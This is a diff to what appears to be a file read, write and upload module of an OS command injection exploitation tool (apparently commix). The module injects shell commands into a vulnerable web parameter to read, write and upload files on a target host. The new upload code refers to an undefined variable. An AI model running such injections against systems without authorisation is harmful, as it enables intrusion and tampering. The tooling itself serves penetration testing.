@@ -23,12 +23,14 @@ from src.utils import settings
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_injector
+from src.core.injections.semiblind_based.techniques.file_based import fb_injector
 
 """
  The "tempfile-based" injection technique on Semiblind OS Command Injection.
  __Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive resutls.
 """
-   
+
+payload = ""
       
 """
 Read a file from the target host.
@@ -37,7 +39,7 @@ def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method
   file_to_read = menu.options.file_read
   # Execute command
   cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
-  check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+  check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = output 
   try:
     shell = "".join(str(p) for p in shell)
@@ -46,14 +48,14 @@ def file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method
   if shell:
     # if menu.options.verbose:
     #   print ""
-    sys.stdout.write(Style.BRIGHT + "\n\n (!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
+    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
     sys.stdout.flush()
     print shell
     output_file = open(filename, "a")
     output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
     output_file.close()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
      
 
@@ -63,7 +65,7 @@ Write to a file on the target host.
 def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -89,16 +91,17 @@ def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_metho
   else:
     dest_to_write = menu.options.file_dest
   OUTPUT_TEXTFILE = dest_to_write
-  
+
   # Execute command
   cmd = settings.FILE_WRITE + " '"+ content + "' "
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = output
   try:
-    shell = "".join(str(p) for p in shell)
+    file_contents = "".join(str(p) for p in shell)
   except TypeError:
     pass
-  
+
+  print ""
   # Check if file exists!
   cmd = "echo $(ls " + dest_to_write + ")"
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -110,13 +113,17 @@ def file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_metho
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL + "\n\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n\n")
    sys.stdout.flush()
 
-
+  # Do the dec-to-text transformation
+  settings.TFB_DECIMAL = True
+  cmd = settings.FILE_WRITE + " '"+ file_contents + "'" + " > " + "'"+ dest_to_write + "'"
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+  
 """
 Upload a file on the target host.
 """
@@ -127,7 +134,7 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
   try:
     urllib2.urlopen(file_to_upload)
   except urllib2.HTTPError, err:
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n\n")
     sys.stdout.flush()
     sys.exit(0)
 
@@ -151,10 +158,11 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = output
   try:
-    shell = "".join(str(p) for p in shell)
+    file_contents = "".join(str(p) for p in shell)
   except TypeError:
     pass
   
+  print ""
   ## Check if file exists!
   cmd = "echo $(ls " + dest_to_upload + ")"
   check_how_long, output  = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
@@ -166,28 +174,32 @@ def file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_meth
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_ALL + "\n\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n\n")
    sys.stdout.flush()
 
-
+  # Do the dec-to-text transformation
+  settings.TFB_DECIMAL = True
+  cmd = file_contents + "'" + " > " + "'"+ dest_to_write + "'"
+  response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+  
 """
 Check the defined options
 """
 def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   
-  if menu.options.file_read:
-    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-    settings.FILE_ACCESS_DONE = True
-
   if menu.options.file_write:
     file_write(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
     file_upload(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    settings.FILE_ACCESS_DONE = True
+
+  if menu.options.file_read:
+    file_read(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE :
